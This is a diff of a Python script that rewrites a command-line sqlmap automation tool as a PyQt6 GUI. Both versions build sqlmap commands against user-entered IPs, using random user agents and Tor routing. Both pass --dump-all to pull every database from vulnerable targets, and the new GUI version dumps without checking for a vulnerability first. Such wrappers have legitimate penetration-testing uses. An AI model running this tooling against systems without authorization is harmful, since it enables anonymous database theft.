@@ -1,90 +1,125 @@
+from PyQt6.QtWidgets import (
+    QApplication, QMainWindow, QWidget, QLabel, QLineEdit, QPushButton,
+    QVBoxLayout, QHBoxLayout, QComboBox, QTextEdit, QFileDialog, QSpinBox
+)
+from PyQt6.QtCore import Qt
+import sys
+import os
 import subprocess
 import datetime
-import os
-import sys
-this_os=os.name
 
+class SQLMapGUI(QMainWindow):
+    def __init__(self):
+        super().__init__()
+        self.setWindowTitle("SQLMap Automation Tool")
+        self.setGeometry(200, 200, 800, 600)
+        self.initUI()
 
-#---------------------------------------------------------------------------------------------------------------------
-#check if it is vulnerable
-def is_vulnerable(module_path,ip,method="GET",data=None,n="5",threads="2",cookies=None):
-    if this_os=='nt':
-        print("Windows")
-        if not module_path:
-            print("PATH is required!!!")
-            sys.exit(1)
-        y=os.path.join(module_path, "sqlmap.py")
-        og_cmd=["python",f"{y}","-u",f"http://{ip}",f"--threads={threads}",f"--crawl={n}","--batch","--level=2","--risk=2","--dbs","--random-agent"]
-    else:
-        og_cmd=["sqlmap","-u",f"http://{ip}",f"--threads={threads}",f"--crawl={n}","--batch","--level=2","--risk=2","--dbs","--tor","--random-agent"]   
-    
-    
-    if method.upper()=="POST":
-        og_cmd.extend(["--data",data])
-    if cookies:
-        og_cmd.extend(["--cookie", cookies])   
-    try:
-        output=subprocess.run(og_cmd,stderr=subprocess.PIPE,stdout=subprocess.PIPE,text=True)     
-    except Exception as e:
-        print(f"ERROR....!\n{e}")
-    print(output.stdout)
-    if "back-end DBMS" in output.stdout:
-        return  True
-    else:
-        return False
-#---------------------------------------------------------------------------------------------------------------------
-def dump_if_vulnerable(module_path,ip,method="GET",data=None,crawal="5",threads="2",cookies=None):   
-    ts_folder = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
-    output_folder = f"sqlmap_op/sqlmap_{ip.replace('.', '_')}_{ts_folder}"
-    os.makedirs(output_folder,exist_ok=True)
-    if this_os=='nt':
-        print("Windows OS")
-        y=os.path.join(module_path, "sqlmap.py")
-        cmd=["python",f"{y}","-u",f"http://{ip}",f"--threads={threads}",f"--crawl={crawal}","--batch","--level=2","--risk=2","--tor","--dump-all","--random-agent","--output-dir", output_folder,"--banner"]
-    else:
-        cmd=["sqlmap","-u",f"http://{ip}",f"--threads={threads}",f"--crawl={crawal}","--batch","--level=2","--risk=2","--tor","--dump-all","--random-agent","--output-dir", output_folder,"--banner"]   
-    
-    if method.upper()=="POST":
-        cmd.extend(["--data",data])
-    if cookies:
-        cmd.extend(["--cookie", cookies]) 
-    try:
-        subprocess.run(cmd,stderr=subprocess.PIPE,stdout=subprocess.PIPE,text=True)
-    except Exception as e:
-        print(f"ERROR1....!\n{e}")
+    def initUI(self):
+        layout = QVBoxLayout()
 
-    
-    print(f"Output is stored in: {output_folder}")
+        # IP
+        self.ip_input = QLineEdit()
+        self.ip_input.setPlaceholderText("Enter IP or URL (comma-separated)")
+        layout.addWidget(QLabel("Target(s):"))
+        layout.addWidget(self.ip_input)
 
+        # Method
+        self.method_box = QComboBox()
+        self.method_box.addItems(["GET", "POST"])
+        layout.addWidget(QLabel("HTTP Method:"))
+        layout.addWidget(self.method_box)
 
+        # Data
+        self.data_input = QLineEdit()
+        self.data_input.setPlaceholderText("id=1&name=admin")
+        layout.addWidget(QLabel("POST Data (if applicable):"))
+        layout.addWidget(self.data_input)
 
+        # Crawl Depth and Threads
+        hbox = QHBoxLayout()
+        self.crawl_spin = QSpinBox()
+        self.crawl_spin.setRange(1, 20)
+        self.crawl_spin.setValue(5)
+        self.thread_spin = QSpinBox()
+        self.thread_spin.setRange(1, 10)
+        self.thread_spin.setValue(2)
+        hbox.addWidget(QLabel("Crawl Depth:"))
+        hbox.addWidget(self.crawl_spin)
+        hbox.addWidget(QLabel("Threads:"))
+        hbox.addWidget(self.thread_spin)
+        layout.addLayout(hbox)
 
+        # Cookies
+        self.cookie_input = QLineEdit()
+        layout.addWidget(QLabel("Cookie (optional):"))
+        layout.addWidget(self.cookie_input)
 
-def main():
-    print("\n\t\tSQLMAP AUTOMATER\n")
-    ip=input("Enter IPs: ").strip()
-    if ip=='' or ip=='\n':
-        print("NO IP Detected")
-        sys.exit()
-    if this_os=='nt':
-        module_path=input("Enter sqlmap.py path: ").strip()
-    else:
-        module_path=None     
+        # SQLMap path (for Windows)
+        self.path_input = QLineEdit()
+        self.path_button = QPushButton("Browse sqlmap.py")
+        self.path_button.clicked.connect(self.browse_sqlmap)
+        path_layout = QHBoxLayout()
+        path_layout.addWidget(self.path_input)
+        path_layout.addWidget(self.path_button)
+        layout.addWidget(QLabel("SQLMap.py Path (Windows only):"))
+        layout.addLayout(path_layout)
 
-    splitted_ip=[i.strip() for i in ip.replace(",", " ").split() if i.strip()]
-    methods=input("Enter[GET/POST]: ").strip() or "GET"
-    data=input("Enter data e.g[id=1]: ").strip() or None
-    crawal=input("Enter directory Crawl depth: ").strip() or "5"
-    thread1=input("Enter no. of Threads: ").strip() or "2"
-    cookies1=input("Enter Cookie if available: ").strip() or None
-    for j in splitted_ip:
-        if is_vulnerable(module_path,j,methods,data,crawal,thread1,cookies1):
-            print("IS VULNERABLE")
-            dump_if_vulnerable(module_path,j,methods,data,crawal,thread1,cookies1)
-        else:
-            print(f"{j} is not VULNERABLE")    
+        # Output
+        self.output_box = QTextEdit()
+        self.output_box.setReadOnly(True)
+        layout.addWidget(QLabel("Scan Output:"))
+        layout.addWidget(self.output_box)
 
-if __name__=='__main__':
-    main()
+        # Scan button
+        self.scan_button = QPushButton("Start Scan")
+        self.scan_button.clicked.connect(self.start_scan)
+        layout.addWidget(self.scan_button)
 
+        container = QWidget()
+        container.setLayout(layout)
+        self.setCentralWidget(container)
 
+    def browse_sqlmap(self):
+        file_path, _ = QFileDialog.getOpenFileName(self, "Select sqlmap.py")
+        self.path_input.setText(file_path)
+
+    def start_scan(self):
+        targets = self.ip_input.text().strip().split(",")
+        method = self.method_box.currentText()
+        data = self.data_input.text().strip()
+        crawl = str(self.crawl_spin.value())
+        threads = str(self.thread_spin.value())
+        cookies = self.cookie_input.text().strip()
+        sqlmap_path = self.path_input.text().strip()
+        os_type = os.name
+
+        for ip in targets:
+            ip = ip.strip()
+            ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+            folder = f"sqlmap_op/sqlmap_{ip.replace('.', '_')}_{ts}"
+            os.makedirs(folder, exist_ok=True)
+
+            if os_type == 'nt':
+                cmd = ["python", sqlmap_path, "-u", f"http://{ip}", "--threads", threads, "--crawl", crawl,
+                       "--batch", "--level=2", "--risk=2", "--tor", "--dump-all", "--random-agent", "--output-dir", folder, "--banner"]
+            else:
+                cmd = ["sqlmap", "-u", f"http://{ip}", "--threads", threads, "--crawl", crawl,
+                       "--batch", "--level=2", "--risk=2", "--tor", "--dump-all", "--random-agent", "--output-dir", folder, "--banner"]
+
+            if method == "POST":
+                cmd.extend(["--data", data])
+            if cookies:
+                cmd.extend(["--cookie", cookies])
+
+            try:
+                result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+                self.output_box.append(f"[+] Output for {ip}:\n{result.stdout}")
+            except Exception as e:
+                self.output_box.append(f"[!] Error running SQLMap on {ip}: {e}")
+
+if __name__ == "__main__":
+    app = QApplication(sys.argv)
+    gui = SQLMapGUI()
+    gui.show()
+    sys.exit(app.exec())
